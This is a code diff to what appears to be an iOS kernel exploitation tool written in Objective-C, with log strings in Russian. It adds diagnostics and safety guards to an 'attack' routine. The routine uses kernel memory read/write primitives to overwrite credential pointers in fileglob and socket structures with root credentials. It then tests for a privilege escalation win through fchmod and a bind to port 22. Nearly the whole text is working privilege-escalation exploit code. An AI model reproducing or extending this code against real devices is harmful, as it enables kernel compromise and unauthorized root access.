@@ -2304,6 +2304,10 @@ static NSString *kpFmtSptmFn(uint64_t raw)
         [r appendString:@"[RESULT] АТАКА: FAIL — KRW не активна, сначала эксплойт.\n"];
         return r;
     }
+    // 2.0.52: без frame table kpFrameTypeOf всегда -1 → гейт 0x21 никогда
+    // не открывался и свопы молча пропускались (step8/step11 не печатались).
+    uint64_t ftVA = [self frameTableVAWithLog:r];
+    kpNote(r, [NSString stringWithFormat:@"  [ATK] frameTable=%#llx", (unsigned long long)ftVA]);
     kpNote(r, @"  [ATK] step1: resolve proc");
     uint64_t selfProc = [self findSelfProcByPidFast:(uint32_t)getpid() log:r];
     if (!selfProc) { [r appendString:@"[RESULT] АТАКА: FAIL — proc\n"]; return r; }
@@ -2328,7 +2332,12 @@ static NSString *kpFmtSptmFn(uint64_t raw)
     uint64_t rootRWpa = kpLooksLikeKernelPointer(rootRW) ? kvtophys(rootRW & ~0x3fffULL) : 0;
     uint64_t myRWk = 0, rootRWk = 0, myRef0 = 0, rootRef0 = 0;
     BOOL refsOK = NO;
-    if (myRWpa && rootRWpa && kpFrameTypeOf(myRWpa) == 0x21 && kpFrameTypeOf(rootRWpa) == 0x21) {
+    int myRWt = myRWpa ? kpFrameTypeOf(myRWpa) : -1;
+    int rootRWt = rootRWpa ? kpFrameTypeOf(rootRWpa) : -1;
+    kpNote(r, [NSString stringWithFormat:@"  [ATK] step4diag: myRW=%#llx pa=%#llx t=%d rootRW=%#llx pa=%#llx t=%d",
+              (unsigned long long)myRW, (unsigned long long)myRWpa, myRWt,
+              (unsigned long long)rootRW, (unsigned long long)rootRWpa, rootRWt]);
+    if (myRWpa && rootRWpa && myRWt == 0x21 && rootRWt == 0x21) {
         myRWk = phystokv(myRWpa); rootRWk = phystokv(rootRWpa);
         myRef0 = early_kread64(myRWk + (myRW & 0x3fff));
         rootRef0 = early_kread64(rootRWk + (rootRW & 0x3fff));
@@ -2361,17 +2370,23 @@ static NSString *kpFmtSptmFn(uint64_t raw)
     kpNote(r, [NSString stringWithFormat:@"  [ATK] step6: fileglob=%#llx fg_cred=%@",
               (unsigned long long)glob, fgOff != 0xFFFFFFFF ? @"FOUND ★" : @"not found"]);
     if (fgOff != 0xFFFFFFFF && kpLooksLikeKernelPointer(glob)) {
+        errno = 0;
         uint64_t gPA = kvtophys(glob & ~0x3fffULL);
+        int gWalkErr = errno;
         int gT = gPA ? kpFrameTypeOf(gPA) : -1;
-        kpNote(r, [NSString stringWithFormat:@"  [ATK] step7: fileglob type=%d", gT]);
+        kpNote(r, [NSString stringWithFormat:@"  [ATK] step7: fileglob pageVA=%#llx pagePA=%#llx type=%d walkErr=%d",
+                  (unsigned long long)(glob & ~0x3fffULL), (unsigned long long)gPA, gT, gWalkErr]);
         if (gT == 0x21) {
             uint64_t old = early_kread64(glob + fgOff);
             early_kwrite64(glob + fgOff, rootZVA);
+            uint64_t rb = early_kread64(glob + fgOff);
             int ch = fchmod(tfd, 0644);   // одна проба, мгновенно
             early_kwrite64(glob + fgOff, old);   // restore СРАЗУ
-            kpNote(r, [NSString stringWithFormat:@"  [ATK] step8: fg swap → fchmod=%d errno=%d → restored — %@",
-                      ch, errno, ch == 0 ? @"ROOT-FS WIN ★★" : @"проба мимо (process-cred авторизация)"]);
+            kpNote(r, [NSString stringWithFormat:@"  [ATK] step8: fg swap readback=%#llx → fchmod=%d errno=%d → restored — %@",
+                      (unsigned long long)rb, ch, errno, ch == 0 ? @"ROOT-FS WIN ★★" : @"проба мимо (process-cred авторизация)"]);
             if (ch == 0) kpNote(r, @"=== ROOT (filesystem) WIN ===");
+        } else {
+            kpNote(r, @"  [ATK] step8: SKIPPED — type!=0x21, kwrite запрещён (апертура-фолт = ребут)");
         }
     }
     if (tfd >= 0) close(tfd);
@@ -2395,20 +2410,26 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             for (uint32_t o = 0; o + 8 <= 0x300; o += 8)
                 if (kp_untag_ptr(early_kread64(sVA + o)) == curUcred) { socOff = o; break; }
         }
+        errno = 0;
         uint64_t sPA = kpLooksLikeKernelPointer(sVA) ? kvtophys(sVA & ~0x3fffULL) : 0;
+        int sWalkErr = errno;
         int sT = sPA ? kpFrameTypeOf(sPA) : -1;
-        kpNote(r, [NSString stringWithFormat:@"  [ATK] step10: socket=%#llx type=%d so_cred=%@",
-                  (unsigned long long)sVA, sT, socOff != 0xFFFFFFFF ? @"FOUND ★" : @"not found"]);
+        kpNote(r, [NSString stringWithFormat:@"  [ATK] step10: socket=%#llx pagePA=%#llx type=%d walkErr=%d so_cred=%@",
+                  (unsigned long long)sVA, (unsigned long long)sPA, sT, sWalkErr,
+                  socOff != 0xFFFFFFFF ? @"FOUND ★" : @"not found"]);
         if (socOff != 0xFFFFFFFF && sT == 0x21) {
             uint64_t old = early_kread64(sVA + socOff);
             early_kwrite64(sVA + socOff, rootZVA);
+            uint64_t rb = early_kread64(sVA + socOff);
             struct sockaddr_in sin; memset(&sin, 0, sizeof(sin));
             sin.sin_family = AF_INET; sin.sin_port = htons(22); sin.sin_addr.s_addr = htonl(INADDR_ANY);
             int pBind = bind(ts, (struct sockaddr *)&sin, sizeof(sin));
             early_kwrite64(sVA + socOff, old);   // restore СРАЗУ
-            kpNote(r, [NSString stringWithFormat:@"  [ATK] step11: so swap → bind22=%d errno=%d → restored — %@",
-                      pBind, errno, pBind == 0 ? @"SOCKET-ROOT WIN ★★" : @"проба мимо"]);
+            kpNote(r, [NSString stringWithFormat:@"  [ATK] step11: so swap readback=%#llx → bind22=%d errno=%d → restored — %@",
+                      (unsigned long long)rb, pBind, errno, pBind == 0 ? @"SOCKET-ROOT WIN ★★" : @"проба мимо"]);
             if (pBind == 0) kpNote(r, @"=== SOCKET-ROOT WIN ===");
+        } else {
+            kpNote(r, @"  [ATK] step11: SKIPPED — type!=0x21, kwrite запрещён");
         }
     }
     if (ts >= 0) close(ts);
